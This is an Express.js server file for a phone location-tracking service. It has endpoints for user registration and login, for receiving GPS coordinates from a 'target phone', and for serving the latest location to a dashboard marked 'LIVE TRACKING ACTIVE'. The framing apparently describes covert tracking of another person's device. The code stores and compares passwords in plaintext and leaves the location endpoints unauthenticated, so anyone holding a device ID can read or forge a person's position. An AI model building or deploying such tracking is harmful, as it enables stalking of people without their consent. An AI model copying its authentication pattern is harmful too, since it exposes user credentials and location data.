const express = require('express');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config();

const Location = require('./models/Location');
const User = require('./models/User');

const app = express();
const PORT = process.env.PORT || 10000; // Render port

app.use(cors());
app.use(express.json());

// Public folder ki jagah ab hum 'frontend' use kar rahe hain
app.use(express.static(path.join(__dirname, 'frontend')));

// 1. DATABASE CONNECTION
const mongoURI = process.env.MONGO_URI; 
mongoose.connect(mongoURI)
    .then(() => console.log("[+] DATABASE CONNECTED SUCCESSFULLY!"))
    .catch(err => console.log("[-] DATABASE CONNECTION FAILED:", err));

// 2. USER REGISTRATION
app.post('/api/register', async (req, res) => {
    try {
        const { username, password, deviceId } = req.body;
        const existingUser = await User.findOne({ username });
        if (existingUser) {
            return res.status(400).json({ success: false, message: "Username already exists!" });
        }
        const newUser = new User({ username, password, deviceId });
        await newUser.save();
        res.json({ success: true, message: "Account created successfully!" });
    } catch (error) {
        res.status(500).json({ success: false, message: "Server Error during registration" });
    }
});

// 3. USER LOGIN
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = await User.findOne({ username, password });
        if (user) {
            res.json({ success: true, deviceId: user.deviceId });
        } else {
            res.status(401).json({ success: false, message: "Invalid Credentials!" });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: "Server Error during login" });
    }
});

// 4. RECEIVE LOCATION FROM TARGET PHONE
app.post('/api/update-location', async (req, res) => {
    try {
        const { deviceId, lat, lng, accuracy } = req.body;
        const newLocation = new Location({ deviceId, latitude: lat, longitude: lng, accuracy });
        await newLocation.save();
        res.json({ success: true, message: "Location securely updated." });
    } catch (error) {
        res.status(500).json({ success: false, message: "Database Error!" });
    }
});

// 5. SEND LOCATION TO DASHBOARD
app.post('/api/get-location', async (req, res) => {
    try {
        const { deviceId } = req.body;
        const latestLocation = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
        if (latestLocation) {
            res.json({
                lat: parseFloat(latestLocation.latitude),
                lng: parseFloat(latestLocation.longitude),
                accuracy: parseFloat(latestLocation.accuracy),
                status: "LIVE TRACKING ACTIVE"
            });
        } else {
            res.json({ status: "TARGET OFFLINE / NO DATA" });
        }
    } catch (error) {
        res.status(500).json({ status: "ERROR FETCHING DATA" });
    }
});

// 6. CATCH-ALL ROUTE (Crash-proof aur Frontend folder ke sath)
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'index.html'));
});

// 7. START SERVER
app.listen(PORT, () => {
    console.log(`[+] SYSTEM ONLINE ON PORT ${PORT}`);
});
